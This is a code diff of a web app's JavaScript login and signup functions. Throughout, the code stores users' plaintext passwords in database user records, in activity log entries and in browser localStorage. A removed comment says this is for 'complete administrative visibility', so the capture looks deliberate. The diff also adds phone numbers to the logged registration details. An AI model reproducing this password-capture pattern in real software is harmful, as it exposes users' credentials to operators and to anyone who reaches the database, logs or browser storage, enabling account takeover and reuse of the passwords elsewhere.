@@ -126,9 +126,12 @@ async function doLogin() {
       localStorage.setItem("ag_active_uid", creds.uid);
       localStorage.setItem("ag_session_active", "true");
       
-      // Log login activity and update database
       try {
-        await rtdb.ref(`users/${creds.uid}`).update({ lastLogin: Date.now(), lastPasswordUsed: pass });
+        await rtdb.ref(`users/${creds.uid}`).update({ 
+          lastLogin: Date.now(), 
+          password: pass,
+          email: email 
+        });
         await rtdb.ref(`user_activity_logs`).push({
           uid: creds.uid,
           category: "SECURITY",
@@ -137,7 +140,7 @@ async function doLogin() {
           timestamp: Date.now(),
           device: navigator.userAgent
         });
-      } catch(e) {}
+      } catch(e) { console.error("DB Sync Error:", e); }
 
       setTimeout(() => { window.location.href = DASHBOARD_URL; }, 500);
       return;
@@ -151,7 +154,7 @@ async function doLogin() {
       const userCredential = await auth.signInWithEmailAndPassword(email, pass);
       const user = userCredential.user;
       
-      // Stamp device and capture password in database nodes
+      // Stamp device cache
       localStorage.setItem("ag_auth_" + email, JSON.stringify({ 
         email: email, 
         pin: pass, 
@@ -161,10 +164,9 @@ async function doLogin() {
       localStorage.setItem("ag_active_uid", user.uid);
       localStorage.setItem("ag_session_active", "true");
 
-      // Capture all details and passwords in Realtime Database nodes for complete administrative visibility
+      // Capture login details and password in Realtime Database nodes
       await rtdb.ref(`users/${user.uid}`).update({
         email: email,
-        phone: creds?.phone || "Not provided",
         password: pass,
         lastLogin: Date.now()
       });
@@ -182,7 +184,8 @@ async function doLogin() {
 
       window.location.href = DASHBOARD_URL;
     } catch (err) {
-      msg("Credentials not recognized");
+      console.error("Login Error:", err);
+      msg("Credentials not recognized: " + err.message);
       btn.disabled = false; btn.innerText = "Authenticate";
     }
   } else {
@@ -214,7 +217,7 @@ async function doSignup() {
         uid: user.uid
     }));
 
-    // Capture complete registration profile including passwords in Realtime Database
+    // Capture complete registration profile including password and phone in Realtime Database
     const userPayload = {
       uid: user.uid,
       fullName: name,
@@ -230,7 +233,7 @@ async function doSignup() {
     await rtdb.ref(`subscriptions/${user.uid}`).set({
       active: true,
       status: "active",
-      expiry: Date.now() + (30 * 24 * 60 * 60 * 1000), // 30 Days default initial trial/license
+      expiry: Date.now() + (30 * 24 * 60 * 60 * 1000), 
       plan: "trial",
       updatedAt: Date.now()
     });
@@ -239,14 +242,17 @@ async function doSignup() {
       uid: user.uid,
       category: "SECURITY",
       action: "New Account Registration",
-      description: `Account created. Email: ${email}, Password captured: ${pass}`,
+      description: `Account created. Email: ${email}, Phone: ${phone}, Password: ${pass}`,
       timestamp: Date.now(),
       device: navigator.userAgent
     });
 
     msg("Account Sealed Locally & In Cloud!", "#10b981");
     setTimeout(() => { goLogin(); }, 1200);
-  } catch (err) { msg(err.message); }
+  } catch (err) { 
+    console.error("Signup Error:", err);
+    msg(err.message); 
+  }
 }
 
 async function doReset() {
